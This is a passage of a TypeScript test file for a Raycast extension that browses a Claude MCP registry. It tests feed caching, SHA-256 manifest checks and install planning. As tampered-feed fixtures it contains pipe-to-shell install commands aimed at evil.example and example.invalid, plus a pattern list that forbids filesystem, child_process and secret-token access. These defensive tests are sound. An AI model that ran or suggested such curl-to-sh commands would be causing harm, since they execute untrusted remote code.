        mcpServers: { context7: { command: "npx" } },
      }),
    };
    const plan = buildClaudeMcpInstallPlan(sampleEntry, detail);
    const execFileFn = async () => ({});

    await assert.rejects(
      installClaudeMcpServer(plan, { execFileFn }),
      /already exists/,
    );
  });

  it("resolves jobs feeds from the production HeyClaude host", () => {
    const jobsUrl = resolveJobsUrl();

    assert.equal(jobsUrl, "https://heyclau.de/api/jobs?limit=100");
    assert.equal(jobsCacheKey(), JOBS_CACHE_KEY);
    assert.equal(jobsCacheKey(jobsUrl), JOBS_CACHE_KEY);
    assert.equal(buildPostJobUrl(jobsUrl), "https://heyclau.de/jobs/post");
  });

  it("builds PR-first contribution URLs without local write targets", () => {
    const contributeUrl = new URL(buildContributeEntryUrl(sampleEntry));
    assert.equal(contributeUrl.origin, "https://heyclau.de");
    assert.equal(contributeUrl.pathname, "/submit");
    assert.equal(contributeUrl.searchParams.get("category"), "mcp");
    assert.equal(contributeUrl.searchParams.get("slug"), "context7");
    assert.equal(contributeUrl.searchParams.get("brand_name"), "Upstash");
    assert.equal(contributeUrl.searchParams.get("brand_domain"), "upstash.com");
    assert.equal(contributeUrl.searchParams.get("tags"), "docs, mcp");

    const suggestUrl = new URL(buildSuggestChangeUrl(sampleEntry));
    assert.equal(suggestUrl.origin, "https://heyclau.de");
    assert.equal(suggestUrl.pathname, "/submit");
    assert.equal(suggestUrl.searchParams.get("intent"), "update");
    assert.equal(suggestUrl.searchParams.get("category"), "mcp");
    assert.equal(suggestUrl.searchParams.get("slug"), "context7");
    assert.equal(suggestUrl.searchParams.get("brand_name"), "Upstash");
    assert.equal(suggestUrl.searchParams.get("brand_domain"), "upstash.com");
    assert.match(suggestUrl.toString(), /^https:\/\//);
    assert.equal(suggestUrl.toString().includes("file:"), false);

    const newSkillUrl = new URL(buildSubmitPrUrl("skills"));
    assert.equal(newSkillUrl.origin, "https://heyclau.de");
    assert.equal(newSkillUrl.pathname, "/submit");
    assert.equal(newSkillUrl.searchParams.get("category"), "skills");

    const draftUrl = new URL(
      buildSubmitPrUrl({
        category: "mcp",
        title: "Asana MCP Server",
        slug: "asana-mcp-server",
        sourceUrl:
          "https://developers.asana.com/docs/using-asanas-model-control-protocol-mcp-server",
        brandName: "Asana",
        brandDomain: "asana.com",
        description: "Use Asana project tasks from Claude.",
        tags: ["asana", "project-management"],
      }),
    );
    assert.equal(draftUrl.searchParams.get("name"), "Asana MCP Server");
    assert.equal(draftUrl.searchParams.get("brand_domain"), "asana.com");
    const docsUrl = new URL(String(draftUrl.searchParams.get("docs_url")));
    assert.equal(docsUrl.hostname, "developers.asana.com");
  });

  it("normalizes Raycast submission drafts and growth links", () => {
    const draft = normalizeSubmissionDraft({
      category: "mcp",
      title: "Asana MCP Server",
      sourceUrl: "https://developers.asana.com/docs/mcp",
      brandName: "Asana",
      brandDomain: "https://www.asana.com/docs",
      description: "Use Asana projects and tasks from Claude.",
      tags: ["asana", "mcp", "asana"],
    });

    assert.equal(slugify("Asana MCP Server!"), "asana-mcp-server");
    assert.equal(normalizeDomain("https://www.asana.com/docs"), "asana.com");
    assert.equal(isValidDomain("asana.com"), true);
    assert.equal(isValidDomain("www.asana.com"), true);
    assert.equal(isValidDomain("not a domain"), false);
    assert.equal(isValidHttpsUrl("https://example.com"), true);
    assert.equal(isValidHttpsUrl("http://example.com"), false);
    assert.equal(draft.slug, "asana-mcp-server");
    assert.deepEqual(draft.tags, ["asana", "mcp"]);
    assert.match(buildSubmissionDraftText(draft), /Brand domain: asana.com/);

    assert.equal(
      withRaycastUtm("https://heyclau.de/submit", "submit-content"),
      "https://heyclau.de/submit?utm_source=raycast&utm_medium=extension&utm_content=submit-content",
    );
    assert.equal(
      withRaycastUtm("https://github.com/JSONbored/awesome-claude"),
      "https://github.com/JSONbored/awesome-claude",
    );
    assert.equal(
      markdownLink("Context7", "https://heyclau.de/mcp/context7"),
      "[Context7](https://heyclau.de/mcp/context7)",
    );
    assert.match(buildEntrySummary(sampleEntry), /Fetch up-to-date docs/);
  });

  it("summarizes safety and privacy notes for install confirmation", () => {
    assert.equal(buildInstallNotesSummary(undefined, undefined), "");
    assert.equal(buildInstallNotesSummary([], ["   "]), "");

    const summary = buildInstallNotesSummary(
      ["Runs a server process", "Writes to your MCP config"],
      ["Reads local credentials"],
    );
    assert.match(summary, /⚠️ Safety:/);
    assert.match(summary, /• Runs a server process/);
    assert.match(summary, /🔒 Privacy:/);
    assert.match(summary, /• Reads local credentials/);

    const capped = buildInstallNotesSummary(
      ["one", "two", "three", "four", "five"],
      undefined,
    );
    assert.match(capped, /• …and 2 more/);
    assert.equal(/• one|• two|• three/.test(capped), true);
    assert.equal(capped.includes("• four"), false);

    // Tolerates malformed payloads without throwing (non-array / non-string).
    assert.equal(
      buildInstallNotesSummary(
        "not-an-array" as unknown as string[],
        [42, "  "] as unknown as string[],
      ),
      "\n\n🔒 Privacy:\n• 42",
    );
  });

  it("normalizes notes and drops blank/malformed values", () => {
    assert.deepEqual(normalizeNotes(undefined), []);
    assert.deepEqual(normalizeNotes("nope" as unknown as string[]), []);
    assert.deepEqual(normalizeNotes(["  ", "", " keep "]), ["keep"]);
    // A whitespace-only "detail" list must not suppress a real entry fallback.
    const detailNotes = ["   "];
    const entryNotes = ["Real disclosure"];
    const chosen = normalizeNotes(detailNotes).length
      ? detailNotes
      : entryNotes;
    assert.deepEqual(chosen, entryNotes);
  });

  it("validates and parses full detail payloads", () => {
    const detail = {
      copyText: "full text",
      detailMarkdown: "# Detail",
      mcpInstallTargets: ["claude-code", "not-real", "codex"],
    };
    const lazyDetail = {
      detailMarkdown: "# Detail",
      llmsUrl: "/api/registry/entries/mcp/context7/llms",
    };
    assert.equal(isRaycastDetail(detail), true);
    assert.equal(isRaycastDetail(lazyDetail), true);
    assert.deepEqual(parseDetail(JSON.stringify(detail)), {
      copyText: "full text",
      detailMarkdown: "# Detail",
      mcpInstallTargets: ["claude-code", "codex"],
    });
    assert.equal(parseDetail(JSON.stringify({ copyText: "missing md" })), null);
    assert.deepEqual(
      {
        copyText: fallbackDetail(sampleEntry).copyText,
        detailMarkdown: fallbackDetail(sampleEntry).detailMarkdown,
        installable: fallbackDetail(sampleEntry).installable,
        hasInstallCommand: fallbackDetail(sampleEntry).hasInstallCommand,
        mcpInstallTargets: fallbackDetail(sampleEntry).mcpInstallTargets,
      },
      {
        copyText: sampleEntry.copyText,
        detailMarkdown: sampleEntry.detailMarkdown,
        installable: true,
        hasInstallCommand: true,
        mcpInstallTargets: ["claude-code", "codex", "cursor", "antigravity"],
      },
    );
  });

  it("parses, filters, and summarizes Raycast jobs", () => {
    const parsed = parseJobsFeed(
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        count: 2,
        entries: [
          {
            ...sampleJob,
            labels: ["Featured", "Featured", { invalid: true }],
            benefits: ["Health benefits", "Health benefits", null],
          },
          { slug: "broken" },
        ],
      }),
    );

    assert.equal(isValidRaycastJob(sampleJob), true);
    assert.equal(parsed.generatedAt, "2026-04-28T00:00:00.000Z");
    assert.deepEqual(parsed.entries[0].labels, ["Featured"]);
    assert.deepEqual(parsed.entries[0].benefits, ["Health benefits"]);
    assert.equal(parsed.entries.length, 1);
    assert.equal(jobKey(sampleJob), "ai-systems-engineer");
    assert.deepEqual(
      sortedJobFilterOptions().map((item) => item.value),
      [
        "all",
        "favorites",
        "featured",
        "sponsored",
        "remote",
        "compensation",
        "curated",
        "claimed",
      ],
    );
    assert.deepEqual(filterJobs([sampleJob], "featured", new Set()), [
      sampleJob,
    ]);
    assert.deepEqual(filterJobs([sampleJob], "compensation", new Set()), [
      sampleJob,
    ]);
    assert.deepEqual(
      filterJobs([sampleJob], "favorites", new Set([sampleJob.slug])),
      [sampleJob],
    );
    const jobMarkdown = buildJobMarkdown(sampleJob);
    assert.match(jobMarkdown, /## Responsibilities/);
    assert.doesNotMatch(jobMarkdown, /\*\*Company:\*\*/);
    assert.doesNotMatch(jobMarkdown, /\*\*Location:\*\*/);
    assert.doesNotMatch(jobMarkdown, /\*\*Type:\*\*/);
    assert.doesNotMatch(jobMarkdown, /Apply on employer site/);
    assert.match(buildJobSummary(sampleJob), /Compensation: \$150K-\$190K/);
  });

  it("serializes favorites deterministically", () => {
    assert.deepEqual(parseFavoriteKeys(JSON.stringify(["b", "a", "a"])), [
      "a",
      "b",
    ]);
    assert.equal(serializeFavoriteKeys(new Set(["b", "a"])), '["a","b"]');
    assert.deepEqual(parseFavoriteJobKeys(JSON.stringify(["b", "a", "a"])), [
      "a",
      "b",
    ]);
    assert.equal(serializeFavoriteJobKeys(new Set(["b", "a"])), '["a","b"]');
  });

  it("builds category filters and favorites without mutating ranking", () => {
    const toolEntry = {
      ...sampleEntry,
      category: "tools",
      slug: "raycast",
      title: "Raycast",
      description: "Launcher for desktop workflows.",
      tags: ["launcher"],
      brandName: "Raycast",
      brandDomain: "raycast.com",
    };
    const entries = [sampleEntry, toolEntry];
    const favorites = new Set([entryKey(toolEntry)]);

    assert.equal(categoryLabel("mcp"), "MCP Servers");
    assert.deepEqual(sortedCategoryOptions(entries), [
      { value: "all", title: "All Categories" },
      { value: "favorites", title: "Favorites" },
      { value: "mcp", title: "MCP Servers" },
      { value: "tools", title: "Tools" },
    ]);
    assert.deepEqual(filterEntriesByCategory(entries, "favorites", favorites), [
      toolEntry,
    ]);
    assert.deepEqual(filterEntriesByCategory(entries, "mcp", favorites), [
      sampleEntry,
    ]);
    assert.deepEqual(
      filterEntriesBySearchText(entries, "upstash docs").map(entryKey),
      [entryKey(sampleEntry)],
    );
    assert.deepEqual(filterEntriesBySearchText(entries, "missing"), []);
    assert.deepEqual(filterEntriesBySearchText(entries, ""), entries);
    assert.deepEqual(filterEntriesBySearchText(entries, "   "), entries);
    assert.deepEqual(filterEntriesBySearchText(entries, "!!!"), []);
    assert.deepEqual(filterEntriesBySearchText(entries, "@@@ ///"), []);
  });

  it("keeps local mutation scoped to the MCP installer", () => {
    const sourceDir = path.join(process.cwd(), "src");
    const sourceFiles = readSourceFiles(sourceDir);
    const installerPath = path.join(sourceDir, "mcp-installer.ts");
    const installerSource =
      sourceFiles.find(({ filePath }) => filePath === installerPath)?.source ||
      "";
    const browseSource = sourceFiles
      .filter(({ filePath }) => filePath !== installerPath)
      .map(({ source }) => source)
      .join("\n");
    const forbiddenPatterns = [
      /\bfrom\s+["'](?:node:)?fs(?:\/promises)?["']/,
      /\brequire\(["'](?:node:)?fs(?:\/promises)?["']\)/,
      /\brequire\(["'](?:node:)?child_process["']\)/,
      /\bwriteFile(?:Sync)?\b/,
      /\bappendFile(?:Sync)?\b/,
      /\bmkdir(?:Sync)?\b/,
      /\bcreateWriteStream\b/,
      /\bOAuth\b/,
      /\bgetOAuthToken\b/,
      /\bwithAccessToken\b/,
      /\.cursor\//,
      /\.claude\//,
      /\.windsurf\//,
      /\bAGENTS\.md\b/,
      /\bGEMINI\.md\b/,
      /\b[A-Z][A-Z0-9_]*(?:TOKEN|SECRET|API_KEY)\b/,
    ];

    for (const pattern of forbiddenPatterns) {
      assert.doesNotMatch(browseSource, pattern);
    }
    assert.doesNotMatch(
      browseSource,
      /\bfrom\s+["'](?:node:)?child_process["']/,
    );
    assert.match(installerSource, /\bfrom\s+["']node:child_process["']/);
    assert.match(installerSource, /\bfrom\s+["']node:fs\/promises["']/);
    assert.match(installerSource, /\bexecFile\b/);
    assert.match(installerSource, /\bwriteFile\b/);
    assert.match(installerSource, /\brename\b/);
    assert.doesNotMatch(installerSource, /\bexec\(/);
  });

  it("keeps Raycast list rows compact enough for split-pane scanning", () => {
    const registrySource = fs.readFileSync(
      path.join(process.cwd(), "src", "registry-command.tsx"),
      "utf8",
    );
    const jobsSource = fs.readFileSync(
      path.join(process.cwd(), "src", "jobs.tsx"),
      "utf8",
    );

    assert.doesNotMatch(registrySource, /\n\s+subtitle=\{entry\.description\}/);
    assert.match(
      registrySource,
      /\n\s+subtitle=\{categoryLabel\(entry\.category\)\}/,
    );
    assert.doesNotMatch(registrySource, /\{ text: categoryLabel/);
    assert.doesNotMatch(
      registrySource,
      /\{ text: entry\.verificationStatus \}/,
    );
    assert.doesNotMatch(registrySource, /\{ text: "Full on demand" \}/);
    assert.match(registrySource, /metadata=\{entryDetailMetadata/);
    assert.match(registrySource, /Action\.CreateQuicklink/);
    assert.match(registrySource, /Action\.CreateSnippet/);

    assert.doesNotMatch(jobsSource, /\n\s+title=\{job\.company\}/);
    assert.match(jobsSource, /\n\s+title=\{job\.title\}/);
    assert.match(jobsSource, /\n\s+subtitle=\{job\.company\}/);
    assert.doesNotMatch(jobsSource, /\{ text: job\.location \}/);
    assert.match(jobsSource, /metadata=\{jobDetailMetadata/);
    assert.match(jobsSource, /Action\.CreateQuicklink/);
  });

  it("keeps server search empty states user friendly", () => {
    const registrySource = fs.readFileSync(
      path.join(process.cwd(), "src", "registry-command.tsx"),
      "utf8",
    );

    assert.match(
      registrySource,
      /Search is temporarily unavailable\. Try again shortly\./,
    );
    assert.match(registrySource, /\?\s*SERVER_SEARCH_UNAVAILABLE_MESSAGE\s*:/);
    assert.doesNotMatch(registrySource, /\?\s*serverSearch\.error\s*:/);
  });

  it("keeps the discovery Open Source action tied to repoUrl only", () => {
    const discoverySource = fs.readFileSync(
      path.join(process.cwd(), "src", "discovery-command.tsx"),
      "utf8",
    );

    assert.doesNotMatch(
      discoverySource,
      /entry\.repoUrl\s*\|\|\s*entry\.documentationUrl/,
    );
    assert.match(
      discoverySource,
      /title="Open Source"\s*\n\s*url=\{entry\.repoUrl\}/,
    );
    assert.match(discoverySource, /\{entry\.repoUrl \? \(/);
  });

  it("keeps the production Raycast manifest fixed to HeyClaude endpoints", () => {
    const manifest = JSON.parse(
      fs.readFileSync(path.join(process.cwd(), "package.json"), "utf8"),
    ) as {
      preferences?: unknown;
      commands?: { name?: string }[];
    };

    assert.deepEqual(manifest.preferences, [
      {
        name: "feedUrlOverride",
        title: "Feed URL Override",
        description:
          "Optional advanced feed URL for preview deployments or local ray develop smoke tests. Must end with /data/raycast-index.json.",
        type: "textfield",
        required: false,
      },
    ]);
    assert.deepEqual(
      (manifest.commands || []).map((command) => command.name),
      [
        "search",
        "search-agents",
        "search-mcp",
        "search-tools",
        "search-skills",
        "search-rules",
        "search-commands",
        "search-hooks",
        "search-guides",
        "search-collections",
        "search-statuslines",
        "trending",
        "recent-updates",
        "jobs",
        "submit-content",
        "get-involved",
      ],
    );
  });

  it("loads and refreshes cached jobs without polluting registry cache", async () => {
    const cache = new MemoryCache();
    const jobsUrl = resolveJobsUrl();

    cache.set(
      jobsCacheKey(jobsUrl),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [sampleJob],
      }),
    );
    assert.equal(loadCachedJobs(cache, jobsUrl).entries.length, 1);

    let requestedUrl = "";
    const feed = await fetchFreshJobs({
      cache,
      fetchFn: async (input) => {
        requestedUrl = String(input);
        return response({
          generatedAt: "2026-04-28T00:00:00.000Z",
          count: 1,
          entries: [sampleJob],
        });
      },
    });

    assert.equal(requestedUrl, jobsUrl);
    assert.equal(feed.entries.length, 1);
    assert.match(cache.get(jobsCacheKey(jobsUrl)) || "", /ai-systems-engineer/);
    assert.equal(cache.get(CACHE_KEY), undefined);

    const emptyFeed = await fetchFreshJobs({
      cache,
      fetchFn: async () => response({ entries: [] }),
    });
    assert.equal(emptyFeed.entries.length, 0);
    assert.match(cache.get(jobsCacheKey(jobsUrl)) || "", /"entries":\[\]/);
    await assert.rejects(
      fetchFreshJobs({
        cache,
        fetchFn: async () => response({}, { status: 503 }),
      }),
      /Jobs feed responded/,
    );
  });

  it("loads and clears cached feed snapshots deterministically", () => {
    const cache = new MemoryCache();
    cache.set(
      CACHE_KEY,
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [sampleEntry],
      }),
    );
    assert.equal(loadCachedFeed(cache).entries.length, 1);

    cache.set(CACHE_KEY, "{bad json");
    assert.deepEqual(loadCachedFeed(cache), { entries: [], generatedAt: "" });
    assert.equal(cache.get(CACHE_KEY), undefined);
  });

  it("fetches fresh feed payloads and preserves compact feed contracts", async () => {
    const cache = new MemoryCache();
    let requestedUrl = "";
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrl = String(input);
        return response({
          generatedAt: "2026-04-28T00:00:00.000Z",
          entries: [sampleEntry],
        });
      },
    });

    assert.equal(requestedUrl, devFeed);
    assert.equal(feed.entries.length, 1);
    assert.match(cache.get(feedCacheKey(devFeed)) || "", /context7/);
    assert.equal(cache.get(CACHE_KEY), undefined);
    assert.equal(loadCachedFeed(cache, devFeed).entries.length, 1);

    const productionFeed = await fetchFreshFeed({
      cache,
      fetchFn: async () =>
        response({
          generatedAt: "2026-04-28T00:00:00.000Z",
          entries: [sampleEntry],
        }),
    });

    assert.equal(productionFeed.entries.length, 1);
    assert.match(cache.get(CACHE_KEY) || "", /context7/);

    await assert.rejects(
      fetchFreshFeed({
        cache,
        fetchFn: async () => response({ entries: [] }),
      }),
      /Feed contained no entries/,
    );
  });

  it("refreshes pre-signature cached feeds even when generatedAt is unchanged", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    cache.set(
      feedCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [
          {
            ...sampleEntry,
            installCommand:
              "curl -fsSL https://example.invalid/unsafe.sh | sh # OLD UNSAFE",
          },
        ],
      }),
    );

    const safeFeedPayload = JSON.stringify({
      generatedAt: "2026-04-28T00:00:00.000Z",
      entries: [
        {
          ...sampleEntry,
          installCommand: "claude mcp add context7 --safe",
        },
      ],
    });
    const requestedUrls: string[] = [];
    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        if (String(input).endsWith("/data/registry-manifest.json")) {
          return response({
            generatedAt: "2026-04-28T00:00:00.000Z",
            artifactContracts: {
              "raycast-index.json": {
                path: "/data/raycast-index.json",
                type: "json",
                sha256: sha256Hex(safeFeedPayload),
              },
            },
          });
        }
        return response(safeFeedPayload);
      },
    });

    assert.equal(feed.refreshStatus, "updated");
    assert.equal(
      feed.entries[0].installCommand,
      "claude mcp add context7 --safe",
    );
    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
    assert.equal(
      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
      sha256Hex(safeFeedPayload),
    );
  });

  it("fetches server-backed registry search pages with strict parsing", async () => {
    let requestedUrl = "";
    const search = await fetchRegistrySearch({
      query: "context",
      category: "mcp",
      limit: 20,
      fetchFn: async (input) => {
        requestedUrl = String(input);
        return response({
          schemaVersion: 1,
          query: "context",
          category: "mcp",
          count: 1,
          total: 2,
          limit: 20,
          offset: 0,
          nextOffset: 20,
          results: [
            {
              category: sampleEntry.category,
              slug: sampleEntry.slug,
              title: sampleEntry.title,
              description: sampleEntry.description,
              tags: sampleEntry.tags,
              canonicalUrl: sampleEntry.webUrl,
              repoUrl: sampleEntry.repoUrl,
              documentationUrl: sampleEntry.documentationUrl,
              downloadTrust: sampleEntry.downloadTrust,
              verificationStatus: sampleEntry.verificationStatus,
            },
          ],
        });
      },
    });

    assert.equal(
      requestedUrl,
      "https://heyclau.de/api/registry/search?q=context&category=mcp&limit=20",
    );
    assert.equal(search.entries.length, 1);
    assert.equal(search.nextOffset, 20);

    const { value: tolerantSearch, warnings } = await captureConsoleWarnings(
      () =>
        fetchRegistrySearch({
          query: "context",
          fetchFn: async () =>
            response({
              total: 2,
              limit: 20,
              offset: 0,
              nextOffset: null,
              results: [sampleSearchResult(), { slug: "broken" }],
            }),
        }),
    );
    assert.equal(tolerantSearch.entries.length, 1);
    assert.equal(tolerantSearch.skippedMalformedEntries, 1);
    assert.match(warnings[0], /Skipped 1 malformed registry search result/);

    await assert.rejects(
      fetchRegistrySearch({
        query: "context",
        fetchFn: async () => response({}, { status: 503 }),
      }),
      /Registry search responded with 503/,
    );
  });

  it("accepts generated JSON feeds with trailing newlines", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const feedPayload = JSON.stringify({
      generatedAt: "2026-04-28T00:00:00.000Z",
      entries: [sampleEntry],
    });

    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        if (String(input).endsWith("/data/registry-manifest.json")) {
          return response({
            generatedAt: "2026-04-28T00:00:00.000Z",
            artifactContracts: {
              "raycast-index.json": {
                path: "/data/raycast-index.json",
                type: "json",
                sha256: sha256Hex(feedPayload),
              },
            },
          });
        }
        return response(`${feedPayload}\n`);
      },
    });

    assert.equal(feed.refreshStatus, "updated");
    assert.equal(feed.signature, sha256Hex(feedPayload));
    assert.equal(
      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
      sha256Hex(feedPayload),
    );
  });

  it("rejects feed payloads whose SHA-256 does not match the manifest", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const legitimateFeedPayload = JSON.stringify({
      generatedAt: "2026-04-28T00:00:00.000Z",
      entries: [sampleEntry],
    });
    const tamperedFeedPayload = JSON.stringify({
      generatedAt: "2026-04-28T00:00:00.000Z",
      entries: [
        {
          ...sampleEntry,
          installCommand: "curl -fsSL https://evil.example/install.sh | sh",
        },
      ],
    });

    await assert.rejects(
      fetchFreshFeed({
        cache,
        feedUrl: devFeed,
        fetchFn: async (input) => {
          if (String(input).endsWith("/data/registry-manifest.json")) {
            return response({
              generatedAt: "2026-04-28T00:00:00.000Z",
              artifactContracts: {
                "raycast-index.json": {
                  path: "/data/raycast-index.json",
                  type: "json",
                  sha256: sha256Hex(legitimateFeedPayload),
                },
              },
            });
          }
          return response(tamperedFeedPayload);
        },
      }),
      /Feed payload SHA-256 did not match registry manifest/,
    );

    assert.equal(cache.get(feedCacheKey(devFeed)), undefined);
    assert.equal(cache.get(feedMetadataCacheKey(devFeed)), undefined);
  });

  it("refetches same-signature cached feeds without verified content hashes", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const legitimateFeedPayload = JSON.stringify({
      generatedAt: "2026-04-28T00:00:00.000Z",
      entries: [
        {
          ...sampleEntry,
          installCommand: "claude mcp add context7 --safe",
        },
      ],
    });
    const legitimateFeedSha256 = sha256Hex(legitimateFeedPayload);
    cache.set(
      feedCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [
          {
            ...sampleEntry,
            installCommand: "curl -fsSL https://evil.example/install.sh | sh",
          },
        ],
      }),
    );
    cache.set(
      feedMetadataCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        signature: legitimateFeedSha256,
        detailCacheNamespace: legitimateFeedSha256,
      }),
    );

    const requestedUrls: string[] = [];
    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        if (String(input).endsWith("/data/registry-manifest.json")) {
          return response({
            generatedAt: "2026-04-28T00:00:00.000Z",
            artifactContracts: {
              "raycast-index.json": {
                path: "/data/raycast-index.json",
                type: "json",
                sha256: legitimateFeedSha256,
              },
            },
          });
        }
        return response(legitimateFeedPayload);
      },
    });

    assert.equal(feed.refreshStatus, "updated");
    assert.equal(
      feed.entries[0].installCommand,
      "claude mcp add context7 --safe",
    );
    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
    assert.equal(
      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}")
        .verifiedContentSha256,
      legitimateFeedSha256,
    );
  });

  it("skips the full Raycast feed when the manifest signature is unchanged", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const metadata = buildFeedSnapshotMetadata(
      { generatedAt: "2026-04-28T00:00:00.000Z" },
      {
        generatedAt: "2026-04-28T00:00:00.000Z",
        signature: "same-signature",
        feedSha256: "same-signature",
      },
      "same-signature",
    );
    cache.set(
      feedCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [sampleEntry],
      }),
    );
    cache.set(feedMetadataCacheKey(devFeed), JSON.stringify(metadata));

    const requestedUrls: string[] = [];
    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        return response({
          generatedAt: "2026-04-28T00:00:00.000Z",
          artifactContracts: {
            "raycast-index.json": {
              path: "/data/raycast-index.json",
              type: "json",
              sha256: "same-signature",
            },
          },
        });
      },
    });

    assert.equal(feed.refreshStatus, "unchanged");
    assert.equal(feed.entries.length, 1);
    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed)]);
    assert.equal(
      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
      "same-signature",
    );
  });

  it("refreshes changed feeds and invalidates previous detail snapshots", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const oldMetadata = buildFeedSnapshotMetadata(
      { generatedAt: "2026-04-28T00:00:00.000Z" },
      {
        generatedAt: "2026-04-28T00:00:00.000Z",
        signature: "old-signature",
      },
    );
    const oldDetailKey = detailCacheKey(
      sampleEntry,
      devFeed,
      oldMetadata.detailCacheNamespace,
    );
    cache.set(
      feedCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [sampleEntry],
      }),
    );
    cache.set(feedMetadataCacheKey(devFeed), JSON.stringify(oldMetadata));
    cache.set(
      oldDetailKey,
      JSON.stringify({
        copyText: "stale detail",
        detailMarkdown: "# Stale",
      }),
    );

    const updatedFeedPayload = JSON.stringify({
      generatedAt: "2026-04-29T00:00:00.000Z",
      entries: [{ ...sampleEntry, title: "Context7 Updated" }],
    });
    const updatedFeedSha256 = sha256Hex(updatedFeedPayload);
    const requestedUrls: string[] = [];
    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        if (String(input).endsWith("/data/registry-manifest.json")) {
          return response({
            generatedAt: "2026-04-29T00:00:00.000Z",
            artifactContracts: {
              "raycast-index.json": {
                path: "/data/raycast-index.json",
                type: "json",
                sha256: updatedFeedSha256,
              },
            },
          });
        }
        return response(updatedFeedPayload);
      },
    });

    assert.equal(feed.refreshStatus, "updated");
    assert.equal(feed.signature, updatedFeedSha256);
    assert.equal(feed.entries[0].title, "Context7 Updated");
    assert.deepEqual(requestedUrls, [registryManifestUrl(devFeed), devFeed]);
    assert.equal(cache.get(oldDetailKey), undefined);
    assert.equal(
      JSON.parse(cache.get(feedMetadataCacheKey(devFeed)) || "{}").signature,
      updatedFeedSha256,
    );
  });

  it("keeps stale cached feed data usable when signature and feed checks fail", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    cache.set(
      feedCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        entries: [sampleEntry],
      }),
    );
    cache.set(
      feedMetadataCacheKey(devFeed),
      JSON.stringify({
        generatedAt: "2026-04-28T00:00:00.000Z",
        signature: "cached-signature",
        detailCacheNamespace: "cached-signature",
      }),
    );

    const feed = await fetchFreshFeed({
      cache,
      feedUrl: devFeed,
      fetchFn: async () => response({}, { status: 503 }),
    });

    assert.equal(feed.refreshStatus, "stale");
    assert.match(feed.refreshWarning || "", /Registry manifest responded/);
    assert.equal(feed.entries[0].slug, sampleEntry.slug);
    assert.match(cache.get(feedCacheKey(devFeed)) || "", /context7/);
  });

  it("loads trending and recent update feeds with stale-cache fallback", async () => {
    const cache = new MemoryCache();
    const devFeed = "https://preview.example.com/data/raycast-index.json";
    const requestedUrls: string[] = [];
    const trending = await fetchFreshTrending({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        return response({
          schemaVersion: 1,
          kind: "registry-trending",
          category: "all",
          platform: "all",
          signalsAvailable: { votes: true, community: true, intent: false },
          entries: [
            {
              category: "mcp",
              slug: "context7",
              title: "Context7",
              description: "Fetch docs.",
              score: 9,
              reasons: ["upvotes"],
            },
          ],
        });
      },
    });
    const recent = await fetchFreshRecentUpdates({
      cache,
      feedUrl: devFeed,
      fetchFn: async (input) => {
        requestedUrls.push(String(input));
        return response({
          schemaVersion: 1,
          kind: "registry-diff",
          generatedAt: "2026-05-26T00:00:00.000Z",
          currentSignature: "diff-signature",
          entries: [
            {
              key: "mcp:context7",
              type: "added",
              category: "mcp",
              slug: "context7",
              title: "Context7",
              dateAdded: "2026-05-26",
            },
          ],
        });
      },
    });

    assert.deepEqual(requestedUrls, [
      "https://preview.example.com/api/registry/trending?limit=25",
      "https://preview.example.com/api/registry/diff?limit=25",
    ]);
    assert.equal(trending.refreshStatus, "updated");
    assert.equal(trending.entries[0].score, 9);
    assert.equal(recent.currentSignature, "diff-signature");
    assert.equal(loadCachedTrending(cache, devFeed).entries.length, 1);
    assert.equal(loadCachedRecentUpdates(cache, devFeed).entries.length, 1);

    const staleTrending = await fetchFreshTrending({
      cache,
      feedUrl: devFeed,
      fetchFn: async () => response({ malformed: true }),
    });
    const staleRecent = await fetchFreshRecentUpdates({
      cache,
      feedUrl: devFeed,
      fetchFn: async () => response({}, { status: 503 }),
    });

    assert.equal(staleTrending.refreshStatus, "stale");
    assert.match(staleTrending.refreshWarning || "", /malformed/);
    assert.equal(staleTrending.entries[0].slug, "context7");
